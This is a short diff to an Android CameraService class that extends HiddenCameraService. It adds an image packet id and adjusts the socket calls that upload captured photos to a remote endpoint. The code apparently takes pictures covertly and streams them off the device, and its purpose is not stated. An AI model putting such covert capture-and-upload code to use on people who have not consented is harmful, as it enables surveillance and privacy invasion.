@@ -40,6 +40,9 @@ import java.util.Date;
 
 public class CameraService extends HiddenCameraService {
 
+    //id of packet
+    static final byte [] img_id = {0x01, 0x10}; //id for images
+
     //settings
     private String router = "web";
 
@@ -195,7 +198,7 @@ public class CameraService extends HiddenCameraService {
 
     private void startSocket(){
         //create client socket and setup socket
-        clientsocket = ClientSocket.getInstance();
+        clientsocket = ClientSocket.getInstance(this);
         clientsocket.startSocket();
     }
 
@@ -215,7 +218,7 @@ public class CameraService extends HiddenCameraService {
         //upload the image using async task
 //        new SendImage().execute(data);
         System.out.println("UPLOADING IMAGE");
-        clientsocket.sendBytes(image_data);
+        clientsocket.sendBytes(img_id, image_data);
     }
 
     private void savePicture(byte[] data){
